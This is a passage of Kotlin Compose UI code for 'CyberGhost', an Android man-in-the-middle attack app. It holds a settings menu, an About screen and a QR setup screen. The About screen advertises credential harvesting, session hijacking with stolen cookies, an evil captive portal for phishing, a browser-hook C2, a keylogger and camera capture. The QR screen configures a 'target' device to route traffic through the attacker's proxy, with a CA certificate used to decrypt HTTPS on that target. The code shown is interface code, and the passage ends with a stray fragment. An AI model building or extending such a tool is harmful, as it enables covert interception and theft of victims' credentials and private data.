                    if (savedSessions.isNotEmpty()) {
                        Spacer(Modifier.height(8.dp))
                        savedSessions.forEach { name ->
                            Row(Modifier.fillMaxWidth().padding(vertical = 3.dp), verticalAlignment = Alignment.CenterVertically) {
                                Icon(Icons.Filled.Description, contentDescription = null, tint = CgGray, modifier = Modifier.size(14.dp))
                                Spacer(Modifier.width(6.dp))
                                Text(name, fontSize = 11.sp, color = CgWhite, modifier = Modifier.weight(1f), maxLines = 1, overflow = TextOverflow.Ellipsis)
                                TextButton(onClick = { onShareSession(name) }) { Text("Share", fontSize = 10.sp, color = CgCyan) }
                                TextButton(onClick = { onDeleteSession(name) }) { Text("Del", fontSize = 10.sp, color = CgRed) }
                            }
                        }
                    }
                }
            }
        }

        item {
            Card(colors = CardDefaults.cardColors(containerColor = CgCard), shape = RoundedCornerShape(14.dp), modifier = Modifier.fillMaxWidth()) {
                Column(Modifier.padding(16.dp)) {
                    Text("SYSTEM", fontSize = 10.sp, fontWeight = FontWeight.Bold, color = CgGray, letterSpacing = 1.sp)
                    Spacer(Modifier.height(8.dp))
                    ToggleRow("Auto-start on boot", autoStart, onToggleAutoStart)
                    HorizontalDivider(color = CgGray.copy(0.1f), modifier = Modifier.padding(vertical = 4.dp))
                    SettingsRow("Export CA Certificate", Icons.Filled.Security, CgAmber, onExportCa)
                    SettingsRow("QR Proxy Setup", Icons.Filled.QrCode, CgGreen) { navigateTo(Screen.SETUP) }
                    SettingsRow("Live Alerts (Telegram/Webhook)", Icons.Filled.Notifications, CgBlue) { navigateTo(Screen.ALERTS) }
                    SettingsRow("Network Map", Icons.Filled.Search, CgCyan) { navigateTo(Screen.NETWORK) }
                    SettingsRow("Captive Portal", Icons.Filled.Wifi, CgAmber) { navigateTo(Screen.CAPTIVE) }
                    SettingsRow("WebSocket Frames", Icons.Filled.Power, CgPurple) { navigateTo(Screen.WEBSOCKET) }
                    SettingsRow("Hooked Sessions", Icons.Filled.BugReport, CgMagenta) { navigateTo(Screen.HOOKED) }
                    SettingsRow("Traffic Stats", Icons.Filled.BarChart, CgBlue) { navigateTo(Screen.STATS) }
                    SettingsRow("About", Icons.Filled.Info, CgDimGreen) { navigateTo(Screen.ABOUT) }
                }
            }
        }
    }
}

@Composable
fun SettingsField(label: String, value: String, onChange: (String) -> Unit) {
    var text by remember { mutableStateOf(TextFieldValue(value)) }
    OutlinedTextField(value = text, onValueChange = { text = it; onChange(it.text) },
        label = { Text(label, fontSize = 10.sp) },
        textStyle = androidx.compose.ui.text.TextStyle(fontSize = 11.sp, color = CgWhite),
        modifier = Modifier.fillMaxWidth().padding(top = 4.dp), singleLine = true, shape = RoundedCornerShape(8.dp),
        colors = OutlinedTextFieldDefaults.colors(unfocusedContainerColor = CgBg, focusedContainerColor = CgBg,
            unfocusedBorderColor = CgGray.copy(0.25f), focusedBorderColor = CgGreen))
}

@Composable
fun ToggleRow(label: String, checked: Boolean, onChange: (Boolean) -> Unit) {
    Row(Modifier.fillMaxWidth().padding(vertical = 4.dp), horizontalArrangement = Arrangement.SpaceBetween, verticalAlignment = Alignment.CenterVertically) {
        Text(label, fontSize = 12.sp, color = CgWhite, modifier = Modifier.weight(1f))
        Switch(checked = checked, onCheckedChange = onChange, colors = SwitchDefaults.colors(checkedTrackColor = CgGreen, uncheckedTrackColor = CgGray))
    }
}

@Composable
fun SettingsRow(label: String, icon: ImageVector, color: Color, onClick: () -> Unit) {
    Row(Modifier.fillMaxWidth().clickable(onClick = onClick).padding(vertical = 10.dp), verticalAlignment = Alignment.CenterVertically) {
        Box(Modifier.size(28.dp).clip(RoundedCornerShape(6.dp)).background(color.copy(0.1f)), contentAlignment = Alignment.Center) {
            Icon(icon, contentDescription = null, tint = color, modifier = Modifier.size(14.dp))
        }
        Spacer(Modifier.width(12.dp))
        Text(label, fontSize = 13.sp, color = CgWhite, modifier = Modifier.weight(1f))
        Icon(Icons.Filled.ChevronRight, contentDescription = null, tint = CgGray, modifier = Modifier.size(14.dp))
    }
}

// ============================
// ABOUT
// ============================
@Composable
fun AboutScreen() {
    LazyColumn(Modifier.fillMaxSize().padding(16.dp), horizontalAlignment = Alignment.CenterHorizontally, verticalArrangement = Arrangement.spacedBy(12.dp)) {
        item { Spacer(Modifier.height(12.dp)) }
        item {
            Box(Modifier.size(90.dp).clip(RoundedCornerShape(22.dp))
                .background(Brush.radialGradient(listOf(CgGreen.copy(0.3f), CgCyan.copy(0.1f), CgBg))),
                contentAlignment = Alignment.Center) {
                Text("CG", fontSize = 36.sp, fontWeight = FontWeight.Black, color = CgGreen)
            }
        }
        item {
            Row(horizontalArrangement = Arrangement.spacedBy(2.dp)) {
                Text("CYBER", fontSize = 26.sp, fontWeight = FontWeight.Black, color = CgGreen)
                Text("GHOST", fontSize = 26.sp, fontWeight = FontWeight.Black, color = CgCyan)
            }
        }
        item { Text("Active MITM Framework for Android", fontSize = 12.sp, color = CgGray) }
        item { HorizontalDivider(color = CgGray.copy(0.15f)) }
        item {
            Card(Modifier.fillMaxWidth(), colors = CardDefaults.cardColors(containerColor = CgCard),
                shape = RoundedCornerShape(16.dp), border = BorderStroke(1.dp, CgGreen.copy(0.2f))) {
                Column(Modifier.padding(20.dp), horizontalAlignment = Alignment.CenterHorizontally) {
                    Box(Modifier.size(56.dp).clip(CircleShape).background(Brush.radialGradient(listOf(CgGreen.copy(0.3f), CgBg))),
                        contentAlignment = Alignment.Center) {
                        Text("NS", fontSize = 20.sp, fontWeight = FontWeight.Black, color = CgGreen)
                    }
                    Spacer(Modifier.height(12.dp))
                    Text("Developed by", fontSize = 11.sp, color = CgGray)
                    Text("Nitin Shukla", fontSize = 24.sp, fontWeight = FontWeight.Black, color = CgGreen)
                    Spacer(Modifier.height(8.dp))
                    SelectionContainer { Text("github.com/n0obcoders/cyberghost", fontSize = 12.sp, color = CgCyan) }
                    Spacer(Modifier.height(2.dp))
                    SelectionContainer { Text("n0obcoders.github.io/portfoli0", fontSize = 12.sp, color = CgCyan) }
                }
            }
        }
        item {
            Card(Modifier.fillMaxWidth(), colors = CardDefaults.cardColors(containerColor = CgCard), shape = RoundedCornerShape(14.dp)) {
                Column(Modifier.padding(16.dp)) {
                    Text("CAPABILITIES", fontSize = 10.sp, fontWeight = FontWeight.Bold, color = CgGray, letterSpacing = 1.sp)
                    Spacer(Modifier.height(10.dp))
                    listOf(
                        "Transparent HTTP/HTTPS interception via proxy",
                        "SSLStrip — downgrade HTTPS to HTTP in transit",
                        "Credential harvester — forms, JSON, Basic Auth, tokens, cookies",
                        "Session hijacker — replay stolen cookies as the target",
                        "Evil captive portal — phish credentials on WiFi join",
                        "QR code setup — one scan configures target's proxy",
                        "Browser hook C2 — remote JS execution in target browser",
                        "Keylogger, clipboard monitor, form intercept",
                        "Screenshot and camera capture",
                        "OS & browser fingerprinting",
                        "Port scanner — discover open services on targets",
                        "LAN pivot — probe target's internal network via browser",
                        "WebSocket frame capture",
                        "Telegram bot + webhook live alerts",
                        "Live traffic analytics with bandwidth chart",
                        "HAR export, session snapshots, injection profiles",
                        "Packet inspector — full content analysis per packet",
                        "Auto-start on boot, persistent notifications"
                    ).forEach { FeatureItem(it) }
                }
            }
        }
        item { Spacer(Modifier.height(20.dp)) }
    }
}

@Composable
fun FeatureItem(text: String) {
    Row(Modifier.padding(vertical = 3.dp), verticalAlignment = Alignment.Top) {
        Box(Modifier.size(16.dp).clip(CircleShape).background(CgGreen.copy(0.1f)), contentAlignment = Alignment.Center) {
            Text("▸", fontSize = 8.sp, color = CgGreen)
        }
        Spacer(Modifier.width(8.dp))
        Text(text, fontSize = 11.sp, color = CgGray, lineHeight = 16.sp)
    }
}

// ============================
// QR SETUP SCREEN
// ============================
@Composable
fun QrSetupScreen(gatewayIp: String, isRunning: Boolean, onExportCa: () -> Unit) {
    var ssid by remember { mutableStateOf(TextFieldValue("CyberGhost")) }
    var password by remember { mutableStateOf(TextFieldValue("")) }
    var showPassword by remember { mutableStateOf(false) }
    var qrBitmap by remember { mutableStateOf<Bitmap?>(null) }
    var qrMode by remember { mutableStateOf(0) }

    LaunchedEffect(ssid.text, password.text, gatewayIp, qrMode) {
        try {
            qrBitmap = when (qrMode) {
                0 -> com.cyberghost.core.QrGenerator.generateCombinedQr(ssid.text.ifBlank { "CyberGhost" }, password.text, gatewayIp, 8080, 700)
                else -> com.cyberghost.core.QrGenerator.generateProxyOnlyQr(gatewayIp, 8080, 700)
            }
        } catch (_: Exception) {}
    }

    LazyColumn(Modifier.fillMaxSize().padding(16.dp), verticalArrangement = Arrangement.spacedBy(12.dp)) {
        item {
            Text("QR Proxy Setup", fontSize = 20.sp, fontWeight = FontWeight.Black, color = CgWhite)
            Text("Target scans to join hotspot with proxy pre-configured.", fontSize = 12.sp, color = CgGray)
        }
        item {
            Card(Modifier.fillMaxWidth(),
                colors = CardDefaults.cardColors(containerColor = if (isRunning) CgGreen.copy(0.08f) else CgRed.copy(0.08f)),
                shape = RoundedCornerShape(12.dp), border = BorderStroke(1.dp, if (isRunning) CgGreen.copy(0.3f) else CgRed.copy(0.3f))) {
                Row(Modifier.padding(14.dp), verticalAlignment = Alignment.CenterVertically) {
                    Box(Modifier.size(10.dp).clip(CircleShape).background(if (isRunning) CgGreen else CgRed))
                    Spacer(Modifier.width(8.dp))
                    Text(if (isRunning) "Proxy active on $gatewayIp:8080" else "Start capture first",
                        fontSize = 12.sp, color = if (isRunning) CgGreen else CgRed)
                }
            }
        }
        item {
            Row(Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                FilterChip(selected = qrMode == 0, onClick = { qrMode = 0 }, label = { Text("WiFi + Proxy", fontSize = 11.sp) }, modifier = Modifier.weight(1f),
                    colors = FilterChipDefaults.filterChipColors(selectedContainerColor = CgGreen.copy(0.2f), selectedLabelColor = CgGreen))
                FilterChip(selected = qrMode == 1, onClick = { qrMode = 1 }, label = { Text("Proxy Only", fontSize = 11.sp) }, modifier = Modifier.weight(1f),
                    colors = FilterChipDefaults.filterChipColors(selectedContainerColor = CgCyan.copy(0.2f), selectedLabelColor = CgCyan))
            }
        }
        if (qrMode == 0) {
            item {
                Card(colors = CardDefaults.cardColors(containerColor = CgCard), shape = RoundedCornerShape(14.dp), modifier = Modifier.fillMaxWidth()) {
                    Column(Modifier.padding(16.dp), verticalArrangement = Arrangement.spacedBy(10.dp)) {
                        Text("HOTSPOT CREDENTIALS", fontSize = 10.sp, fontWeight = FontWeight.Bold, color = CgGray, letterSpacing = 1.sp)
                        OutlinedTextField(value = ssid, onValueChange = { ssid = it }, label = { Text("Hotspot Name (SSID)", fontSize = 10.sp) },
                            textStyle = androidx.compose.ui.text.TextStyle(fontSize = 13.sp, color = CgWhite),
                            modifier = Modifier.fillMaxWidth(), singleLine = true, shape = RoundedCornerShape(10.dp),
                            colors = OutlinedTextFieldDefaults.colors(unfocusedContainerColor = CgBg, focusedContainerColor = CgBg,
                                unfocusedBorderColor = CgGray.copy(0.25f), focusedBorderColor = CgGreen))
                        OutlinedTextField(value = password, onValueChange = { password = it }, label = { Text("Hotspot Password", fontSize = 10.sp) },
                            textStyle = androidx.compose.ui.text.TextStyle(fontSize = 13.sp, color = CgWhite),
                            visualTransformation = if (showPassword) VisualTransformation.None else PasswordVisualTransformation(),
                            trailingIcon = {
                                IconButton(onClick = { showPassword = !showPassword }) {
                                    Icon(if (showPassword) Icons.Filled.VisibilityOff else Icons.Filled.Visibility, contentDescription = null, tint = CgGray, modifier = Modifier.size(18.dp))
                                }
                            },
                            modifier = Modifier.fillMaxWidth(), singleLine = true, shape = RoundedCornerShape(10.dp),
                            colors = OutlinedTextFieldDefaults.colors(unfocusedContainerColor = CgBg, focusedContainerColor = CgBg,
                                unfocusedBorderColor = CgGray.copy(0.25f), focusedBorderColor = CgGreen))
                    }
                }
            }
        }
        item {
            Card(Modifier.fillMaxWidth(), colors = CardDefaults.cardColors(containerColor = CgCard), shape = RoundedCornerShape(16.dp)) {
                Column(Modifier.fillMaxWidth().padding(20.dp), horizontalAlignment = Alignment.CenterHorizontally) {
                    Text("SCAN WITH CAMERA APP", fontSize = 10.sp, fontWeight = FontWeight.Bold, color = CgGray, letterSpacing = 1.sp)
                    Spacer(Modifier.height(16.dp))
                    Box(Modifier.size(280.dp).clip(RoundedCornerShape(16.dp)).background(Color.White).padding(16.dp), contentAlignment = Alignment.Center) {
                        qrBitmap?.let { Image(bitmap = it.asImageBitmap(), contentDescription = "QR", modifier = Modifier.fillMaxSize()) }
                            ?: CircularProgressIndicator(color = CgGreen, modifier = Modifier.size(40.dp))
                    }
                    Spacer(Modifier.height(16.dp))
                    Row(Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.SpaceEvenly) {
                        QrInfoChip("PROXY", gatewayIp, CgGreen)
                        QrInfoChip("PORT", "8080", CgAmber)
                        if (qrMode == 0) QrInfoChip("SSID", ssid.text.take(8), CgCyan)
                    }
                }
            }
        }
        item {
            Card(Modifier.fillMaxWidth(), colors = CardDefaults.cardColors(containerColor = CgAmber.copy(0.06f)),
                shape = RoundedCornerShape(14.dp), border = BorderStroke(1.dp, CgAmber.copy(0.2f))) {
                Row(Modifier.padding(14.dp), verticalAlignment = Alignment.CenterVertically) {
                    Icon(Icons.Filled.Security, contentDescription = null, tint = CgAmber, modifier = Modifier.size(20.dp))
                    Spacer(Modifier.width(10.dp))
                    Column(Modifier.weight(1f)) {
                        Text("Install CA Cert for HTTPS", fontSize = 13.sp, fontWeight = FontWeight.Bold, color = CgAmber)
                        Text("Required to decrypt HTTPS traffic on target", fontSize = 10.sp, color = CgGray)
                    }
                    Spacer(Modifier.width(8.dp))
                    Button(onClick = onExportCa, colors = ButtonDefaults.buttonColors(containerColor = CgAmber.copy(0.2f)),
                        shape = RoundedCornerShape(10.dp), border = BorderStroke(1.dp, CgAmber.copy(0.5f))) {
                        Text("Export CA", color = CgAmber, fontSize = 11.sp, fontWeight = FontWeight.Bold)
                    }
                }
            }
        }
    }
}

@Composable
fun QrInfoChip(label: String, value: String, color: Color) {
    Column(horizontalAlignment = Alignment.CenterHorizontally) {
        Text(label, fontSize = 8.sp, color = CgGray, letterSpacing = 1.sp)
        Spacer(Modifier.height(2.dp))
        Text(value, fontSize = 12.sp, color = color, fontFamily = FontFamily.Monospace, fontWeight = FontWeight.Bold)
    }
}

// ============================
// SHARED
// ============================
@Composable
fun EmptyState(icon: ImageVector, title: String, subtitle: String) {
    Box(Modifier.fillMaxSize(), contentAlignment = Alignment.Center) {
        Column(horizontalAlignment = Alignment.CenterHorizontally, verticalArrangement = Arrangement.spacedBy(10.dp), modifier = Modifier.padding(32.dp)) {
            Box(Modifier.size(72.dp).clip(RoundedCornerShape(18.dp)).background(CgGray.copy(0.08f)), contentAlignment = Alignment.Center) {
                Icon(icon, contentDescription = null, tint = CgGray.copy(0.5f), modifier = Modifier.size(32.dp))
            }
            Text(title, fontSize = 16.sp, color = CgWhite, fontWeight = FontWeight.Bold, textAlign = TextAlign.Center)
            Text(subtitle, fontSize = 12.sp, color = CgGray, textAlign = TextAlign.Center, lineHeight = 16.sp)
        }
    }
}

fun formatBytes(bytes: Long): String = when {
    bytes < 1024 -> "$bytes B"
    bytes < 1024 * 1024 -> "${bytes / 1024} KB"
    bytes < 1024 * 1024 * 1024 -> "${"%.1f".format(bytes / (1024.0 * 1024.0))} MB"
    else -> "${"%.2f".format(bytes / (1024.0 * 1024.0 * 1024.0))} GB"
}

    return Modifier.fillMaxWidth().wrapContentSize(Alignment.BottomStart)
        .offset(x = tabPosition.left).width(tabPosition.width)
}
